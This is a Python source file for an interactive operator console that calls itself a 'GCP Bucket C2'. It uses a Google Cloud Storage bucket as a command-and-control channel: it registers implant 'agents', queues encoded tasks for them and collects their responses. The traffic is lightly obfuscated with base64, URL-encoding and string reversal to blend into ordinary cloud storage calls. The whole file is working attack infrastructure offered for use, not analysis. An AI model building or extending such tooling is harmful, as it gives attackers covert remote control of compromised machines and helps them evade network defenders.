from google.cloud import storage
from google.oauth2 import service_account
from google.cloud.storage.bucket import Bucket
from google.cloud.storage.blob import Blob
from google.cloud.storage.client import Client 
import base64
import urllib.parse
import uuid
from time import sleep
import json
import cmd

class GCPAdminServer(cmd.Cmd):
    prompt = 'GCP Shell> '

    def __init__(self, bucket_name, credentials):
        super().__init__()
        self.bucket_name = bucket_name
        self.client = Client(credentials=credentials)
        self.bucket = Bucket(self.client, name=bucket_name)
        self.agents = {}

    def encode(self, data):
        data = base64.b64encode(data.encode()).decode()
        return urllib.parse.quote_plus(data)[::-1]

    def decode(self, data):
        data = urllib.parse.unquote(data[::-1])
        return base64.b64decode(data).decode()

    def send_task(self, agent_id, task):
        task_key = f"{agent_id}:TaskForYou:{str(uuid.uuid4())}"
        blob = self.bucket.blob(task_key)
        blob.upload_from_string(self.encode(task))
        print(f'Sent task to agent {agent_id}')

    def recv_response(self, agent_id):
        prefix = f"{agent_id}:RespForYou"
        blobs = list(self.bucket.list_blobs(prefix=prefix))
        responses = []
        for blob in blobs:
            response = self.decode(blob.download_as_text())
            responses.append(response)
            blob.delete()
        return responses

    def check_for_new_agents(self):
        prefix = "AGENT:"
        blobs = list(self.bucket.list_blobs(prefix=prefix))
        for blob in blobs:
            agent_id = blob.name.split(':')[1]
            if agent_id not in self.agents:
                self.agents[agent_id] = {'status': 'active'}
                print(f"New agent registered: {agent_id}")
            blob.delete()

    def do_list_agents(self, arg):
        """List all registered agents"""
        self.check_for_new_agents()
        if not self.agents:
            print("No agents registered")
        else:
            for agent_id, info in self.agents.items():
                print(f"Agent: {agent_id}, Status: {info['status']}")

    def do_send_task(self, arg):
        """Send a task to an agent. Usage: send_task <agent_id> <task>"""
        args = arg.split(maxsplit=1)
        if len(args) != 2:
            print("Usage: send_task <agent_id> <task>")
            return
        agent_id, task = args
        if agent_id not in self.agents:
            print(f"Agent {agent_id} not found")
            return
        self.send_task(agent_id, task)

    def do_get_responses(self, arg):
        """Get responses from an agent. Usage: get_responses <agent_id>"""
        if not arg:
            print("Usage: get_responses <agent_id>")
            return
        agent_id = arg
        if agent_id not in self.agents:
            print(f"Agent {agent_id} not found")
            return
        responses = self.recv_response(agent_id)
        if responses:
            for response in responses:
                print(f"Response from {agent_id}: {response}")
        else:
            print(f"No responses from {agent_id}")

    def do_exit(self, arg):
        """Exit the server"""
        print("Exiting...")
        return True

    def do_help(self, arg):
        """List available commands with "help" or detailed help with "help cmd"."""
        super().do_help(arg)

if __name__ == "__main__":
    # Configuration
    info = {
      "type": "service_account",
      "project_id": "<YOUR PROJECT>",
      "private_key_id": "<PRIVATE KEY ID>",
      "private_key": "<PRIVATE KER OF SERVICE ACCOUNT>",
      "client_email": "<SERVICE_ACCOUNT_EMAIL>",
      "client_id": "<CLIENT ID HERE>",
      "auth_uri": "https://accounts.google.com/o/oauth2/auth",
      "token_uri": "https://oauth2.googleapis.com/token",
      "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
      "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/<SERVICE_ACCOUNT_EMAIL>",
      "universe_domain": "googleapis.com"
    }

    credentials = service_account.Credentials.from_service_account_info(info)
    bucket_name = '<YOUR BUCKET HERE>'

    server = GCPAdminServer(bucket_name, credentials)
    server.cmdloop("GCP Bucket C2. Type 'help' for commands.")